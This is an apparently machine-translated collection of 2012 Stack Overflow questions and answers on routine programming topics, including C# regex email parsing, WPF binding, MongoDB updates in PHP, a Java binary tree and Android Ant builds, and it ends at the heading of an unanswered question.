> 时间：2012-04-09T05:47:36.493
> 
> 标签：c#, regex, text-processing

我在一个文本文件中有一组电子邮件。我想把身体抽出来。示例文档如下所示。

```
Email: 1
 ===============

  MIME-Version: 1.0
  Received: by 10.68.8.6 with HTTP; Sat, 7 Apr 2012 01:04:45 -0700 (PDT)
  Date: Sat, 7 Apr 2012 13:34:45 +0530
  Delivered-To: twistyprincess22@gmail.com
  Message-ID: <CAGibXq7_Gjqmp=jOCu2X8+Xngb5QuoqqMQ_ZKbu9jHCoJnFYgA@mail.gmail.com>
  Subject: hello
  From: twisty princess <twistyprincess22@gmail.com>
  To: twisty princess <twistyprincess22@gmail.com>
   Content-Type: multipart/alternative; boundary=047d7b33d826e6762004bd1239b5
  --047d7b33d826e6762004bd1239b5            
  Content-Type: text/plain; charset=ISO-8859-1

   hey How are you doing?

   --047d7b33d826e6762004bd1239b5       
    Content-Type: text/html; charset=ISO-8859-1

     <br><br>hey How are you doing?<br>

     --047d7b33d826e6762004bd1239b5-- 
```

所以从这篇文章中，我只想“嘿，你好吗？”。我希望使用正则表达式和 C# 来完成这项工作。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:53:12.717

使用正则表达式`boundary=([^\s]+)`查找边界名称

```
var bname = _boundaryRegex.Match(text).Groups[1].Value; 
```

然后使用格式化文本捕获正则表达式`bname`

```
var textCapturer = new Regex(string.Format("--{0}(?<text>.*?)(?=--)",bname);
foreach(var match in textCapturer.Matches(text))
{
    Console.WriteLine(match.Groups["text"]);
} 
```

它找到`boundary`参数的值，然后尝试匹配 --BOUNDARY 行之间的文本。

虽然我不建议您使用正则表达式进行这种解析。

# javascript - IE8 支持使用 respond.js 进行媒体查询

> ID：10069437
> 
> 赞同：0
> 
> 时间：2012-04-09T05:48:03.310
> 
> 标签：javascript, jquery, html, css

**继承人设计**
[http://vvcap.net/db/OuxLO​​YioWmjIAavL5N9U.htp](http://vvcap.net/db/OuxLOYioWmjIAavL5N9U.htp)

**这是一个演示！**
[http://designobvio.us/GoldGrid2/](http://designobvio.us/GoldGrid2/)

在 chrome 和 FF 中，媒体查询当然可以正常工作。我真的希望效果在 IE8 中工作。我尝试使用 Respond.js 没有运气:(

我是哑巴吗？我对媒体查询不熟悉；因此 response.js 也是外来的。

我已经阅读了许多其他类似的文章，仍然没有运气。
[HTML5 样板 + 媒体查询在 IE8 中不起作用？](https://stackoverflow.com/questions/8240107/html5-boilerplate-media-queries-not-working-in-ie8)这个很有帮助，但仍然没有结果。

有人对我可以从这里去哪里有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T06:36:46.340

好吧，我有一个解决方案，我们可以为这两个浏览器使用 % 即流畅的布局，即 IE 8 和 IE 7

# c++ - X11图层管理器

> ID：10069450
> 
> 赞同：1
> 
> 时间：2012-04-09T05:49:29.830
> 
> 标签：c++, user-interface, x11, graphic

我有多个应用程序，每个应用程序都有一个来自不同技术的 GUI。

我需要这样做——

```
 1\. Create n layers, one for each application, onto which applications draw.
 2\. Have a layer manager which can perform operations on each of these layers
    (like re sizing, changing opacity etc. ) and then combine them to form a 
    single layer. 
```

有人可以就我应该如何处理这个问题给出一个想法吗？哪些 API 可以帮助我解决这个问题？我真的不知道我应该在谷歌上搜索什么。

实现语言：C++

平台：Linux

另外我想知道这些要求是否可以以独立于平台的方式实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:57:24.023

如果我正确理解了您的问题，您需要某种简单的窗口管理器。

如果是这样，请尽量避免使用 xlib，并使用[QX11EmbedContainer](http://doc.qt.nokia.com/4.7-snapshot/qx11embedcontainer.html)。嵌入窗口是否相当简单，并通过简单地显示/隐藏特定容器来形成图层。

这应该是一个独立于平台的解决方案（应该在不同的硬件上工作，但不能在非 Linux 操作系统上工作）。

* * *

由于您已经在使用 QX11EmbedContainer，并且要求仅使用 xlib（使用 c++），因此您需要使用 XReparentWindowDisplay 函数。这在 xlib 标准的第 9.1 章中有介绍（您可以在[此处](http://static.cray-cyber.org/Documentation/NEC_SX_R10_1/G1AE02E/CHAP9.HTML)查找）。如何使用它应该很简单。

# php - 是否可以在不安装应用程序的情况下更新用户的 Facebook 状态？

> ID：10069453
> 
> 赞同：1
> 
> 时间：2012-04-09T05:50:42.060
> 
> 标签：php, javascript, jquery, facebook

我的目的是让用户通过单击链接或按钮从网页启动状态更新。我很可能会结合使用 php 和 javascript 来执行此操作。我希望在用户不需要安装应用程序的情况下更新状态。是否可以？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:56:08.670

是的，这是可能的。用户需要授予您的应用权限才能执行此操作。看看[https://developers.facebook.com/docs/reference/dialogs/feed/](https://developers.facebook.com/docs/reference/dialogs/feed/)如何给他们一个对话框来更新他们的提要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:04:04.583

是的，这是可能的。可以使用 Graph API，首先您需要获取 OAuth 密钥。[http://developers.facebook.com/tools/explorer](http://developers.facebook.com/tools/explorer)

您可以从上面的链接获取访问令牌。以及您可以检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:55:05.867

如果没有某种身份验证，这是不可能做到的。这是 Facebook 的 API 文档：[https ://developers.facebook.com/](https://developers.facebook.com/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T06:28:05.323

无需安装应用程序。也不需要每次都对应用程序进行身份验证。一旦 App 被用户认证，下次就不需要认证了。

# html - HTML 5 中的历史 API

> ID：10069461
> 
> 赞同：2
> 
> 时间：2012-04-09T05:51:46.240
> 
> 标签：html, html5-history

我正在使用 Google chrome，并且我已经使用 Dive into HMTL 5 中提到的一种检测技术进行了测试，以支持 History API。但是下面的代码似乎不起作用。谁能让我知道我错过了什么？

```
function demo()
 {
  alert("history changing");
if(window.history && history.pushState)
{
    alert("api supported");
}
else
    alert("api not supported");
for(i=0;i<20;i++)
{
    history.pushState(null,null,"\try.html");
}
} 
```

for 循环，其中我希望 url “try.html”在浏览器的历史记录中插入 20 次，似乎不起作用。我从一个名为“try.html”的页面调用此函数，其中函数“demo”在页面加载时执行。页面“try.html”只有一行普通文本。我想要做的是，当用户在加载页面“try.html”后单击浏览器的后退按钮时，他仍将留在同一页面上，因为历史记录应该包含 20 个条目同一页面，即“try.html”，但事实并非如此。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T10:54:09.110

这个对我有用。您可能会遇到两个问题：

1.  如果您尝试从`file://`URI 运行您的函数，那么您将收到一个安全错误。Chrome 对此保持沉默，但 Firefox 会报告该错误。您需要将页面放在 Web 服务器上并通过`http://`.
2.  该字符串`"\try.html"`表示一个制表符，后面跟着一个`ry.html`，您可能的意思是`"/try.html"`。

这是一个基于您的代码[的工作示例。](http://www.boogdesign.com/try-2.html)

# database - 数据库管理源码学习

> ID：10069470
> 
> 赞同：0
> 
> 时间：2012-04-09T05:53:34.193
> 
> 标签：database

我想了解一些关于如何实现数据库管理软件的知识。有没有源代码可用的项目。此外，我不是数据库相关方面的专家，只是对使用 MySQL 数据库有所了解。所以很高兴得到我能理解的代码。

有关此的任何建议都会有所帮助

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T08:05:41.367

对于 Firebird，您可以[在此处查看如何构建代码](http://www.firebirdsql.org/en/building-the-code/)

如果您需要帮助，可以[在这里询问](http://www.firebirdsql.org/en/development-mailing-lists/)

和[http://www.firebirdnews.org/?p=7127](http://www.firebirdnews.org/?p=7127)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T08:14:57.393

我的理解是 PostgreSQL 源代码非常适合学习（我听说 - 但无法确认 - 它在一些大学用于教授 DBMS 开发）。

源代码可以在这里下载：[http ://www.postgresql.org/ftp/source/v9.1.3/](http://www.postgresql.org/ftp/source/v9.1.3/)

如果您更熟悉 Java，您可能想研究一下开源 Java DBMS 引擎之一：

*   HyberSQL：http: [//sourceforge.net/projects/hsqldb/](http://sourceforge.net/projects/hsqldb/)
*   H2：[http ://code.google.com/p/h2database/source/checkout](http://code.google.com/p/h2database/source/checkout)
*   阿帕奇德比：[http ://db.apache.org/derby/derby_downloads.html](http://db.apache.org/derby/derby_downloads.html)

# c# - 在指定的点击次数后触发事件

> ID：10069472
> 
> 赞同：0
> 
> 时间：2012-04-09T05:53:59.610
> 
> 标签：c#

所以我正在处理我的第一个大型 C# 项目，目前正在尝试执行以下操作。屏幕上是一个红色刺激，点击五次后必须发出一个事件。假设在这种情况下显示一个 MessageBox。我知道如何让 MessageBoxes 在单击按钮时显示信息，但是，如前所述，我希望在单击五次后显示此信息。我已经在互联网上搜索了几个星期，但没有找到任何合适的东西。

这是我的代码，单击刺激物只需单击一下即可生成 MessageBox。

```
private void AutoSPanel_Paint(object sender, PaintEventArgs e)
{
}

private void pictureBox1_Click(object sender, EventArgs e)
{
    MessageBox.Show("Clicking once"); 
} 
```

注意我只包括了面板和刺激。我的程序中的所有其他代码均未包含在内。

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:00:04.287

你可以试试这个，例如：

```
private int counter = 0;
public event EventHandler Clicked5TimesEvent;

private void OnClicked5TimesEvent() {
  if (Clicked5TimesEvent != null) {
       Clicked5TimesEvent(this, EventArgs.Empty);
  }
}

private void button1_Click(object sender, EventArgs e) {
  counter++;
  if (counter % 5 == 0) {
      OnClicked5TimesEvent();
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:01:48.300

您可以使用全局计数器来实现此目的：

```
int numClicks = 0;

private void pictureBox1_Click(object sender, EventArgs e)
{
    if (numClicks >= 5)
    {
        MessageBox.Show("Clicking once");
        numClicks = 0;
    }
    else
        numClicks++;
} 
```

# c# - WPF Window Title binding base on Information Class?

> ID：10069475
> 
> 赞同：2
> 
> 时间：2012-04-09T05:54:48.290
> 
> 标签：c#, wpf, binding

I have Wpf-App for working on person object. Person Struct is Sql-server table and I use Linq-to-Sql for my project(so there is class in dbml refer to person).

I have form for update or inserting persons(simple modal window). In this window I have `Peoperty` which have current value of person.

```
public Person CurrentPerson { get; set; } 
```

So what I look for is :

> How bind title of this window base on `CurrentPerson.FullName`? and absolutely Window Title must change if CurrentPerson.FullName Changed!

**Edit: More Info**
I want to change window title base on `CurrentPerson.Name` not set equally same as `CurrentPerson.Name`. So this might be change something. Also I searched before find [this](https://stackoverflow.com/questions/1511053/wpf-data-binding-window-title-to-view-model-property) and this [Question](https://stackoverflow.com/questions/667511/binding-only-part-of-a-label) about changing part of Title. but I need to change some part of Title base on value.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:33:25.427

**Edit**: Deleted the old answer because I completely misunderstood the question.

The problem is likely to be in your binding. I think the binding fails because it cant decide where to search for `CurrentUser(binding source)`. Can you try this -

**Edit 2:** You can name your control and then use that name in Binding Element, like:

```
<Window x:Class="TestApp.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="{Binding ElementName=MW,Path=CurrentUser.FullName, StringFormat='Welcome \{0\}!'}"        
    Name="MW"> 
```

If this doesn't work can you enable WPF debugging for binding expressions by going to:

`Tools -> Options -> Debugging -> Output Window -> WPF Trace Settings` [this is for VS2010; should be similar for others.]

and check if there is a binding error and if so what it is.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T08:22:10.790

Firstly, your codebehind or viewmodel should implement `INotifyPropertyChanged`. After that, implement a property `WindowTitle` like this:

```
public string WindowTitle 
{ 
    get { return "Some custom prefix" + CurrentPerson.FullName; } 
} 
```

After this, whenever your change the `FullName` on your `CurrentPerson`, just throw a `PropertyChanged` event, for example:

```
Person _currentPerson;
public Person CurrentPerson 
{
    get { return _currentPerson; }
    set
    {
        _currentPerson = value;
        if (PropertyChanged != null)
            PropertyChanged(this, new PropertyChangedEventArgs("WindowTitle"));
    }
} 
```

EDIT: Please post your xaml code for the binding, which looking at your comment on the post of Novice, seems like the culprit. Also, check that you are setting the `Window`'s `DataContext` to itself.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T06:10:26.250

You can do it like this:

```
Person _currentPerson;
public Person CurrentPerson 
{
    get { return _currentPerson; }
    set
    {
        _currentPerson = value;
        this.Title = value.FullName;
    }
} 
```

# php - 使用php在mongodb中插入数组

> ID：10069485
> 
> 赞同：0
> 
> 时间：2012-04-09T05:55:55.917
> 
> 标签：php, mongodb

如何使用php在mongodb中插入内部数组我在sheel中运行这个命令然后它运行

`db.domain_data.update({"email":"rohan@walkover.in","url.tlds":".com"},{'$addToSet':{"url.$.domain":{"name":"rohan","status":"yes"}}}})`

但我用php编写这段代码然后它不起作用

```
<?
    $domain=array("name"=>"asvdsfs","status"=>"yes");
    $condition=array("email"=>"rohan@walkover.in","url"=>array("tlds"=>".com"));
    $arr=array('$addToSet'=>array("url.$.domain"=>array($domain)));
    //$arr=array('$addToSet'=>array("url"=>array("$"=>array("domain"=>array($domain)))));
    //Above line also not working.
    $status=$db->domain_data->update($condition,array($arr));
?> 
```

如何编写上面运行正确的 php 代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T08:32:01.907

我想你可能有额外的数组

```
<?     
      $domain=array("name"=>"asvdsfs","status"=>"yes");     
      $condition=array("email"=>"rohan@walkover.in","url.tlds"=>".com");//1 more change//,"url"=>array("tlds"=>".com")          
      $arr=array('$addToSet'=>array("url.$.domain"=>$domain));    // change this line 
      //$arr=array('$addToSet'=>array("url"=>array("$"=>array("domain"=>array($domain)))));     
      //Above line also not working.     
      $status=$db->domain_data->update($condition,$arr);   // change this line 

?> 
```

# wpf - 如何限制宽度和高度 元素等于其内部内容？

> ID：10069493
> 
> 赞同：2
> 
> 时间：2012-04-09T05:56:35.270
> 
> 标签：wpf, xaml, silverlight-4.0

```
<Grid x:Name="mainGrid">
                <Border BorderBrush="Black">
                        <Grid Name="detailGrid"> 
```

在这里，`detailGrid`和它`border`需要完整的宽度和高度，可以从外部获得`mainGrid`，而里面的内容的`detailGrid`宽度和高度要小得多。

如何限制`Border`或/和的宽度和高度`detailGrid`以适应其内容，以便外部网格的背景可见？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T07:50:45.437

将边框和内部网格`HorizontalAlignment`设置`VerticalAlignment`为`Center`。（或者只是边界应该这样做）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T07:01:29.070

如果您的用户控件已定义`Height`并且`Width`属性将其删除。

然后为您定义`ColumnDefinitions`and并将它们的And设置为。`RowDefinitions``Grid``Height``Width``Auto`

# java - 我在创建扫描整个二叉树的方法时遇到问题，你能帮我吗？（仍然需要帮助）

> ID：10069496
> 
> 赞同：-3
> 
> 时间：2012-04-09T05:57:12.313
> 
> 标签：java, methods, binary-tree

```
import java.io.*;
import java.util.*;              

import javax.swing.JOptionPane;
////////////////////////////////////////////////////////////////
class Node
   {
   public char iData;              // data item (key)
   public Node leftChild;         // this node's left child
   public Node rightChild;        // this node's right child

   public void displayNode()      // display ourself
      {
      System.out.print('{');
      System.out.print(iData);
      System.out.print("} ");
      }
   }  // end class Node
////////////////////////////////////////////////////////////////
class Tree
   {
   private Node root;             // first node of tree

// -------------------------------------------------------------
   public Tree()                  // constructor
      { root = null; }            // no nodes in tree yet
// -------------------------------------------------------------
   public Node find(char key)      // find node with given key
      {                           // (assumes non-empty tree)
      Node current = root;               // start at root
      while(current.iData != key)        // while no match,
         {
         if(key < current.iData)         // go left?
            current = current.leftChild;
         else                            // or go right?
            current = current.rightChild;
         if(current == null)             // if no child,
            return null;                 // didn't find it
         }
      return current;                    // found it
      }  // end find()
// -------------------------------------------------------------
   // If (current.leftChild != '+' && current.rightChild != '+')
   //  if ( current.leftChild != '+')                         if(current.rightChild != '+')
   // 
   //       

   public void insert(char id)
      {
      Node newNode = new Node();
      Node plusNode = new Node();
      // make new node
      newNode.iData = id;
      plusNode.iData = '+';         // insert data
      if(root==null)                // no node in root
         root = newNode;
      else                          // root occupied
         {
         Node current = root;       // start at root
         Node parent;
         while(true)                // (exits internally)
            {
            parent = current;
            if(id < current.iData)  // go left?
               {
               current = current.leftChild;               
               if(current == null)  // if end of the line,
                  {                 // insert on left
                  parent.leftChild = newNode;
                  if(parent != root);
                  {parent.rightChild= plusNode;}
                  return;
                  }
               }  // end if go left
            else                    // or go right?
               {
               current = current.rightChild;
               if(current == null)  // if end of the line
                  {                 // insert on right
                  parent.rightChild = newNode;
                  if(parent != root);
                  {parent.leftChild = plusNode;}
                  return;
                  }
               }  // end else go right
            }  // end while
         }  // end else not root
      }  // end insert()
// -------------------------------------------------------------
   public boolean delete(char key) // delete node with given key
      {                           // (assumes non-empty list)
      Node current = root;
      Node parent = root;
      boolean isLeftChild = true;

      while(current.iData != key)        // search for node
         {
         parent = current;
         if(key < current.iData)         // go left?
            {
            isLeftChild = true;
            current = current.leftChild;
            }
         else                            // or go right?
            {
            isLeftChild = false;
            current = current.rightChild;
            }
         if(current == null)             // end of the line,
            return false;                // didn't find it
         }  // end while
      // found node to delete

      // if no children, simply delete it
      if(current.leftChild==null&& current.rightChild==null)
      {
          if(current == root)
              root = null;
          else if(isLeftChild)
              parent.leftChild = null;
          else 
              parent.rightChild = null;
      }

      // if no right child, replace with left subtree
      //put your code here

      else if(current.rightChild==null)
          if(current == root)
              root = current.leftChild;
          else if (isLeftChild)
              parent.leftChild = current.leftChild;
          else
              parent.rightChild = current.leftChild;

      // if no left child, replace with right subtree
      //put your code here

      else if(current.leftChild==null)
          if(current == root)
              root = current.rightChild;
          else if(isLeftChild)
          parent.leftChild=current.rightChild;
          else
              parent.rightChild = current.rightChild;

      else  // two children, so replace with in order successor
         //put your code here
      {
          Node successor = getSuccessor(current);

          // if connect parent of current to successor instead
          if(current == root)
              root = successor;
          else if (isLeftChild)
              parent.leftChild = successor;
          else
              parent.rightChild = successor;
          // connect successor to current's left child
          successor.leftChild = current.leftChild;
      }

      // (successor cannot have a left child)
      return true;                                // success
      }  // end delete()
// -------------------------------------------------------------
   // returns node with next-highest value after delNode
   // goes to right child, then right child's left descendants
   private Node getSuccessor(Node delNode)
      {
      Node successorParent = delNode;
      Node successor = delNode;
      Node current = delNode.rightChild;   // go to right child
      while(current != null)               // until no more
         {                                 // left children,
         successorParent = successor;
         successor = current;
         current = current.leftChild;      // go to left child
         }
                                           // if successor not
      if(successor != delNode.rightChild)  // right child,
         {                                 // make connections
         successorParent.leftChild = successor.rightChild;
         successor.rightChild = delNode.rightChild;
         }
      return successor;
      }
// -------------------------------------------------------------
   public void traverse(int traverseType)
      {
      switch(traverseType)
         {
         case 1: System.out.print("\nPreorder traversal: ");
                 preOrder(root);
                 break;
         case 2: System.out.print("\nInorder traversal:  ");
                 inOrder(root);
                 break;
         case 3: System.out.print("\nPostorder traversal: ");
                 postOrder(root);
                 break;
         }
      System.out.println();
      }
// -------------------------------------------------------------
   private void preOrder(Node localRoot)
      {
      if(localRoot != null)
         {
         System.out.print(localRoot.iData + " ");
         preOrder(localRoot.leftChild);
         preOrder(localRoot.rightChild);
         }
      }
// -------------------------------------------------------------
   private void inOrder(Node localRoot)
      {
      if(localRoot != null)
         {
         inOrder(localRoot.leftChild);
         System.out.print(localRoot.iData + " ");
         inOrder(localRoot.rightChild);
         }
      }
// -------------------------------------------------------------
   private void postOrder(Node localRoot)
      {
      if(localRoot != null)
         {
         postOrder(localRoot.leftChild);
         postOrder(localRoot.rightChild);
         System.out.print(localRoot.iData + " ");
         }
      }
// -------------------------------------------------------------
   public void displayTree()
      {
      Stack globalStack = new Stack();
      globalStack.push(root);
      int nBlanks = 32;
      boolean isRowEmpty = false;
      System.out.println(
      "......................................................");
      while(isRowEmpty==false)
         {
         Stack localStack = new Stack();
         isRowEmpty = true;

         for(int j=0; j<nBlanks; j++)
            System.out.print(' ');

         while(globalStack.isEmpty()==false)
            {
            Node temp = (Node)globalStack.pop();
            if(temp != null)
               {
               System.out.print(temp.iData);
               localStack.push(temp.leftChild);
               localStack.push(temp.rightChild);

               if(temp.leftChild != null ||
                                   temp.rightChild != null)
                  isRowEmpty = false;
               }
            else
               {
               System.out.print("--");
               localStack.push(null);
               localStack.push(null);
               }
            for(int j=0; j<nBlanks*2-2; j++)
               System.out.print(' ');
            }  // end while globalStack not empty
         System.out.println();
         nBlanks /= 2;
         while(localStack.isEmpty()==false)
            globalStack.push( localStack.pop() );
         }  // end while isRowEmpty is false
      System.out.println(
      "......................................................");
      }  // end displayTree()

  /*  public void Play()
   {
      Scanner keyboard = new Scanner(System.in);
      int cont = 1;

      while (cont ==1)
      {
      Node newNode = new Node();
      System.out.println("Please enter a char ");
      char input = keyboard.next().charAt(0);
      newNode.iData = input;

     int response = JOptionPane.showConfirmDialog(null, "Do you want to enter another? ");

      if (response == JOptionPane.YES_OPTION)  
      {

      }

      else if (response == JOptionPane.NO_OPTION)
      {
          cont = 0;
      }

      }

   }*/

   public void fixRoot()
   {

       Node current = root;

       if(current.iData != '+')
       {
           insert(current.iData);
       }
       current.iData = '+';

   }

   public void fixTree()
   // Look at root of the binary tree
   // If the root is a char besides '+', insert it in the tree again
   // use same logic in order to rewrite the whole tree with transverse
   {   Node current = root;

      if (current.leftChild.iData != '+' && current.rightChild.iData != '+')      
      {
        if ( current.leftChild.iData != '+')
        {
            if(current.iData != '+')
           {
               insert(current.iData);
           }
           current.iData = '+';
        }
          if(current.rightChild.iData != '+')
          {
              if(current.iData != '+')
           {
               insert(current.iData);
           }
           current.iData = '+';
          }
      }

}
   public void transverseFix()
   {
       fixTree(root);
   }

  public void fixTree(Node current)
  //Transverse through the tree, node by node
  //At each location, check if leftChild or rightChild does not = '+'

   {
     if (current == null) return;

     fixTree(current.leftChild);

     if(current.iData != '+')
     {
           insert(current.iData);
           current.iData = '+';
     }
     if (current.rightChild != null)
    //{
   //    System.out.println(current.rightChild.iData);
   //    displayTree();
    // }
  //  fixTree(current.rightChild); 

   }

// -------------------------------------------------------------
   }  // end class Tree
////////////////////////////////////////////////////////////////
class TreeApp
   {
   public static void main(String[] args) throws IOException
      {
      char value;
      Tree theTree = new Tree();
      int cont = 1;

      Scanner keyboard = new Scanner(System.in);          
      do
      {
      System.out.println("Please enter a char ");
      char input = keyboard.next().charAt(0);
      theTree.insert(input);     
      System.out.println("Enter more?");
      String input2 = keyboard.next();
      if (input2.equalsIgnoreCase("n"))
      {
          cont = 2;
      }
        }while(cont == 1);

      theTree.displayTree();
      System.out.println("");
      theTree.fixRoot();
      theTree.displayTree();
      System.out.println("");
     // theTree.transverseFix();
      theTree.displayTree();

       //Testing without question
       // theTree.insert('a');
       // theTree.insert('z');
       //  theTree.insert('c');
       //   theTree.fixRoot();
       //  theTree.transverseFix();

      /*while(true)
         {
         System.out.print("Enter first letter of show, ");
         System.out.print("insert, find, delete, or traverse: ");
         int choice = getChar();
         switch(choice)
            {
            case 's':
               theTree.displayTree();
               break;
            case 'i':
               System.out.print("Enter value to insert: ");
               value = getChar();
               theTree.insert(value);
               break;
            case 'f':
               System.out.print("Enter value to find: ");
               value = getChar();
               Node found = theTree.find(value);
               if(found != null)
                  {
                  System.out.print("Found: ");
                  found.displayNode();
                  System.out.print("\n");
                  }
               else
                  System.out.print("Could not find ");
                  System.out.print(value + '\n');
               break;
            case 'd':
               System.out.print("Enter value to delete: ");
               value = getChar();
               boolean didDelete = theTree.delete(value);
               if(didDelete)
                  System.out.print("Deleted " + value + '\n');
               else
                  System.out.print("Could not delete ");
                  System.out.print(value + '\n');
               break;
            case 't':
               System.out.print("Enter type 1, 2 or 3: ");
               value = getChar();
               theTree.traverse(value);
               break;
            default:
               System.out.print("Invalid entry\n");
            }  // end switch
         }  // end while*/
      }  // end main()
// -------------------------------------------------------------
   public static String getString() throws IOException
      {
      InputStreamReader isr = new InputStreamReader(System.in);
      BufferedReader br = new BufferedReader(isr);
      String s = br.readLine();
      return s;
      }
// -------------------------------------------------------------
   public static char getChar() throws IOException
      {
      String s = getString();
      return s.charAt(0);
      }
//-------------------------------------------------------------
   public static int getInt() throws IOException
      {
      String s = getString();
      return Integer.parseInt(s);
      }
// -------------------------------------------------------------
   }  // end class TreeApp
////////////////////////////////////////////////////////////////

public class AlphabatizeLink {

} 
```

我所做的修改发生在 insert() 中，底部的函数以 play() 开头。我想要得到的最终结果是，每个不是“+”作为叶子的字符，每个父母都有 2 个孩子，无论是字母字符还是“+”字符。

所以第一部分，用户输入输入，然后将它们作为字符放入树中。然后 fix root 方法将根重新插入到树的下方，并使根成为“+”。我对树的其余部分有同样的想法，横穿树而不是打印，修复它，但我得到了内存不足的错误。当您在 main 中去掉 theTree.Transverse() 中的 // 并在实际方法中去掉代码行时，您将看到错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:19:17.720

```
void f( Node current )
{
  if (current == null) return;

  f(current.left);

  // your code goes in here.

  f(current.right);

} 
```

Call the above function with **root** node as the actual parameter.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-17T06:26:23.903

这种场景的递归函数（伪代码）的标准结构是这样的：

```
recurse(current)
{
    if(current is null) then return

    recurse(current.left)

    operateOnCurrentNode(current)

    recurse(current.right)
} 
```

你得到一个空指针的原因是，在你的“fixTree(Node current)”递归方法调用中，你有这样的代码：

```
if (current.leftChild.iData != '+' || current.rightChild.iData != '+') 
```

如果 current 有一个值但没有子节点（例如，一个 iData = '+' 的叶节点），那么上面的行将立即中断。您的代码假设，如果您的当前节点有一个值，那么它的左右指针也将有一个值。显然，对于叶节点，这是不正确的。'leftChild' 将为空，此时您实际上是在说：

```
if (current.NULL.iData != '+' || current.NULL.iData != '+') 
```

“NULL”不能有“iData”字段。空指针异常。:)

解决这类问题的最佳方法是确保递归函数中的任何代码*只*查看该节点中当前的内容，而不是其每个子节点中的内容。（这不是一个硬性规定，但它是一个非常好的经验法则。）

我会给你一个可行的例子，但恐怕我不完全确定你的递归代码*应*该做什么。;)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-16T23:02:29.597

在检查它们是否为空之前，在 Tree 类中有很多地方使用变量，这显然不聪明。如果 root == null，此示例将给出 NullPointerException

```
public Node find(char key)
{
    Node current = root;
    while (current.iData != key)            // Exception if root == null
    {l
        if (key < current.iData) 
            current = current.leftChild;
        else
            current = current.rightChild;

        if (current == null)                // Checking for null is futile by now
            return null;
    }
    return current;
} 
```

这也适用于这个功能：

```
public boolean delete(char key)
{
    Node current = root;
    Node parent = root;
    boolean isLeftChild = true;

    while (current.iData != key)        // Exception if root == null
    { 
```

同样在 insert() 你有：

```
if (parent != root);
{
    parent.rightChild = plusNode;
}

if (parent != root);
{
    parent.leftChild = plusNode;
} 
```

注意到那些分号了吗？我怀疑你想要那些。如果这对您没有帮助，您将不得不更清楚地了解您的问题。尝试将您的代码缩短到可以重现错误的最低限度。

# android - 如何使用 Ant 手动构建包含 Android 库项目的 Android 项目？

> ID：10069499
> 
> 赞同：0
> 
> 时间：2012-04-09T05:57:58.033
> 
> 标签：android, ant

在使用 Ant 构建我的项目时，我似乎遇到了障碍。QR code Scanner android 库的资源和我的项目资源似乎没有合并到一个 .arsc 文件中。这是我的脚本的 aapt 部分的片段。

```
<exec executable="${aapt}" failonerror="true">
      <arg value="package" />
      <arg value="-M" />
      <arg path="AndroidManifest.xml" />
      <arg value="-A" />
      <arg path="assets" />
      <arg value="-S" />
      <arg path="./res" /> 
      <arg value="-S" />
      <arg path="../QRcode Scanner/res" />
      <arg value="-I" />
      <arg path="${android-platform-jar}" />
      <arg value="-f" />
      <arg value="-F" />
      <arg value="${resources.file}" />
    </exec> 
```

我的控制台错误日志如下所示：-

```
android-package-resources:
     [echo] Packaging Android resources into C:\Praveen\Eclipse\eclipse-SDK-3.7.
1-win32-x86_64\workspace\HH3_Standard Mode Application/bin/resources.ap_ ...
     [exec] C:\Praveen\Eclipse\eclipse-SDK-3.7.1-win32-x86_64\workspace\QRcode S
canner\res\values\colors.xml:18: error: Resource at contents_text appears in ove
rlay but not in the base package; use <add-resource> to add.
     [exec] C:\Praveen\Eclipse\eclipse-SDK-3.7.1-win32-x86_64\workspace\QRcode S
canner\res\values\colors.xml:19: error: Resource at encode_view appears in overl
ay but not in the base package; use <add-resource> to add.
     [exec] C:\Praveen\Eclipse\eclipse-SDK-3.7.1-win32-x86_64\workspace\QRcode S
canner\res\values\colors.xml:20: error: Resource at help_button_view appears in
overlay but not in the base package; use <add-resource> to add.
     [exec] C:\Praveen\Eclipse\eclipse-SDK-3.7.1-win32-x86_64\workspace\QRcode S
canner\res\values\colors.xml:21: error: Resource at help_view appears in overlay
 but not in the base package; use <add-resource> to add.
     [exec] C:\Praveen\Eclipse\eclipse-SDK-3.7.1-win32-x86_64\workspace\QRcode S
canner\res\values\colors.xml:22: error: Resource at possible_result_points appea
rs in overlay but not in the base package; use <add-resource> to add. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T12:36:24.467

尝试使用这个：

```
<exec executable="${aapt}" failonerror="true">
  <arg value="package" />
  <arg value="-M" />
  <arg path="AndroidManifest.xml" />
  <arg value="-A" />
  <arg path="assets" />
  <arg value="-S" />
  <arg path="./res" /> 
  <arg value="-S" />
  <arg path="../QRcode Scanner/res" />
  <arg value="-I" />
  <arg path="${android-platform-jar}" />
  <arg value="-f" />
  <arg value="-F" />
  <arg value="${resources.file}" />
  <arg value="--auto-add-overlay" />
</exec> 
```

# java - 如何知道打开了哪个应用程序？

> ID：10069503
> 
> 赞同：2
> 
> 时间：2012-04-09T05:58:45.267
> 
> 标签：java, android

